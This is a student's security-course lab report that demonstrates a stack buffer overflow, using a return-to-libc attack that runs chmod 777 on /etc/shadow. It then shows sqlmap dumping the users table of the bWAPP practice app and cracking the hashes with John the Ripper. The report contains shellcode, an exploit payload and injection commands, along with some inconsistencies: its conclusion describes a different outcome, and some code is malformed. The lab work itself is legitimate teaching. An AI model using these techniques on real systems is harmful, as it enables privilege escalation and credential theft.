# Lab #1, 22110012, BachDucCanh, INSE331280E_01FIE

# Task 1: Software buffer overflow attack
 
Given a vulnerable C program 
```
#include <stdio.h>
#include <string.h>

int main(int argc, char* argv[])
{
	char buffer[16];
	strcpy(buffer,argv[1]);
	return 0;
}
```
and a shellcode in C. This shellcode executes chmod 777 /etc/shadow without having to sudo to escalate privilege
```
#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x89\xc3\x31\xd8\x50\xbe\x3e\x1f"
"\x3a\x56\x81\xc6\x23\x45\x35\x21"
"\x89\x74\x24\xfc\xc7\x44\x24\xf8"
"\x2f\x2f\x73\x68\xc7\x44\x24\xf4"
"\x2f\x65\x74\x63\x83\xec\x0c\x89"
"\xe3\x66\x68\xff\x01\x66\x59\xb0"
"\x0f\xcd\x80";

int
void main() {
    int (*ret)() = (int(*)())code;
}
```
**Question 1**:
- Compile both C programs and shellcode to executable code. 
- Conduct the attack so that when C executable code runs, shellcode willc also be triggered. 
  You are free to choose Code Injection or Environment Variable approach to do. 
- Write step-by-step explanation and clearly comment on instructions and screenshots that you have made to successfully accomplished the attack.
**Answer 1**: Must conform to below structure:

### 1. Run the Docker virtual machine.
We will run the Docker virtual machine by this code: 

```docker run -it --privileged -v $HOME/Seclabs:/home/seed/seclabs img4lab```

![image](https://github.com/user-attachments/assets/8da68495-8a51-4e2e-b0d9-6886009cf5bb)


### 2. Compile the vuln code and shellcode program

We will compile file c with this code:

  ``` gcc vuln.c -o vuln.out -fno-stack-protector -z execstack -mpreferred-stack-boundary=2 ```

``` gcc shellcode.c -o shellcode -fno-stack-protector -z execstack -mpreferred-stack-boundary=2 ```


### 4. Draw stackframe
Base on code of vuln.c, we have this stackframe:

And in this task, we will use return-to-libc attack with environment variable. So that we also need the system() stackframe:

![image](https://github.com/user-attachments/assets/afec8b65-5745-41b4-843f-81e47b4fb245)

### 5. Turn off the ASLR and change to use an old bash
We use this code to turn off the address space randomization on stack:
```
sudo sysctl -w kernel.randomize_va_space=0
```
![image](https://github.com/user-attachments/assets/d4e24f58-7ade-4c65-8e1c-4e0ec92c6204)

And this for change to use an old bash

``` sudo ln -sf /bin/zsh /bin/sh ```

![image](https://github.com/user-attachments/assets/e32df50b-aea4-41e1-b6ee-b2cf62936819)

### 6. Create the environment variable
Before create the environment variable, we use pwd to find the current path.

And out current path is: /home/seed/seclabs

We will create the environment variable by this code:
`
export copy_file="/home/seed/seclabs/lab1/shellcode"
`
And check the path with: 
`
echo $path
`

![image](https://github.com/user-attachments/assets/5c395775-3fce-489f-9664-3f6dab67238c)

### 7. Check status of /etc/shadow privilege before we attack

We use this code to check:

``` ls -l /etc/shadow ```

![image](https://github.com/user-attachments/assets/62a727a8-3c60-474b-8ebb-306063245a26)

### 8. Find the address for the attack
We will use gdb peda to find the address

To enter to gdb, use this code:
``` gdb -q vuln.out ```

![image](https://github.com/user-attachments/assets/6e3a0fdb-e746-4134-8b22-9d919bc56667)

Then use these code to find the address:
```
start
p system
p exit
find /home/seed/seclabs/lab1/shellcode
```

![image](https://github.com/user-attachments/assets/6ce129e6-2fac-4981-8f5a-98c5ad0f3947)

We have the address: 

- system: 0xf7e50db0 => \xb0\x0d\xe5\xf7
- exit: 0xf7e449e0 => \xe0\x49\xe4\f7
- /home/seed/seclabs/lab1/shellcode: 0xffffdeb8 => \xb8\xde\xff\xff

### 8. Attack

From them and the stackframe, we have this code:
```
r $(python -c "print('a'*20 + '\xb0\x0d\xe5\xf7' + '\xe0\x49\xe4\xf7' +  '\xb8\xde\xff\xff')")
```

![image](https://github.com/user-attachments/assets/fc76c3e8-9c97-4e84-be48-4c3af0ede91b)

this technique overwrites key addresses on the stack to control program flow, making it possible to execute system commands (like calling system()) without crashing, and it avoids segmentation faults by properly managing return addresses.

### 9. Check result
The shellcode will executes chmod 777 /etc/shadow without having to sudo to escalate privilege. 

Therefore we can use this code to check for the result:
```
ls -l /etc/shadow
```

![image](https://github.com/user-attachments/assets/85a02647-3bfa-4a1e-8407-36d93f5e2fcd)

And by this picture, we can tell that the attack was successful.

**Conclusion**: By using the return-to-libc attack, the vulnerable program was exploited to execute the system call to copy the contents of /etc/passwd to /tmp/outfile. This verifies that the buffer overflow attack was performed successfully.


# Task 2: Attack on the database of bWapp 
### Install bWapp (refer to quang-ute/Security-labs/Web-security).

After run succesfully the apache2 and mysql:

![image](https://github.com/user-attachments/assets/4d165711-9da6-4a7d-81d8-323bafa2d588)

go to:

```http://localhost:8025/login.php```

![image](https://github.com/user-attachments/assets/4327f350-0101-47ab-a9ba-71e2029f030d)

and login, we have this interface:

![image](https://github.com/user-attachments/assets/d946c1bb-be2d-441a-a8b4-8c4225bb6ea6)

Choose sql injection (GET/Select)

![image](https://github.com/user-attachments/assets/faf0bc76-1584-40a8-ae3b-837539742f02)

Add a new movie, reload and get the cookies:

![image](https://github.com/user-attachments/assets/2afb6ea3-7bb2-46b0-8c9e-d9d4a4ad6ee7)

cookies in f12 --> application and reload: 21nqejl3n13tc632lbecfl46c1

![image](https://github.com/user-attachments/assets/1071c752-6b19-4b0d-b6c3-c0e2c30c316c)

So for this lab, the bWAPP security is low 

![image](https://github.com/user-attachments/assets/f17e41d8-b6a8-40f0-876a-4db17133f0b2)


### Install sqlmap.

  ![image](https://github.com/user-attachments/assets/65f56e70-afd1-40be-a615-b7c4448d8216)

**Question 1**: Use sqlmap to get information about all available databases

**Answer 1**:

The command line for getting database is 
```
py sqlmap.py -u "http://localhost:8025/sqli_2.php?movie=1&action=go" --cookie="PHPSESSID=21nqejl3n13tc632lbecfl46c1; security_level=0;" --dbs
```

![image](https://github.com/user-attachments/assets/f3d85d37-8c3e-4222-8fb5-73bd539bbaff)

**Question 2**: Use sqlmap to get tables, users information

**Answer 2**:

Get tables information
```
py sqlmap.py -u "http://localhost:8025/sqli_2.php?movie=1&action=go" --cookie="PHPSESSID=21nqejl3n13tc632lbecfl46c1; security_level=0;" -D bWAPP --tables
```
Reults

![image](https://github.com/user-attachments/assets/66548cad-3a18-4cd5-bd73-f02f0de26d7d)

Get users information
```
py sqlmap.py -u "http://localhost:8025/sqli_2.php?movie=1&action=go" --cookie="PHPSESSID=21nqejl3n13tc632lbecfl46c1; security_level=0;" -D bWAPP -T users --dump
```
Results

![image](https://github.com/user-attachments/assets/dc10246f-e93d-4432-a33f-7fba6f3c6a26)

![image](https://github.com/user-attachments/assets/cd5dc85d-082d-4e96-b629-f2fc90e0f44e)

**Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit

**Answer 3**:

So i will create a hashes.txt file to store username and password

![image](https://github.com/user-attachments/assets/87f00f54-7ac2-46e5-914e-4271b9fe83d6)

Install john the ripper 

![image](https://github.com/user-attachments/assets/41f1a42d-7df7-460b-b6b6-530a0c9e6760)

![image](https://github.com/user-attachments/assets/ed3822d4-274f-48a6-9da3-7232376abb21)


We will use the command below to solve the hashes

```
john hashes.txt

```
The result

![image](https://github.com/user-attachments/assets/5f8c6079-151b-4583-b2a1-7b55b26e2325)


### Conclusion:

In this lab, we explored SQL injection vulnerabilities on the bWAPP application and used sqlmap to exploit them. We successfully extracted databases, tables, and user information. Then, we utilized John the Ripper to crack the hashed passwords of the users. This highlights the importance of securing web applications against common attacks such as SQL injections and strengthening password storage methods.







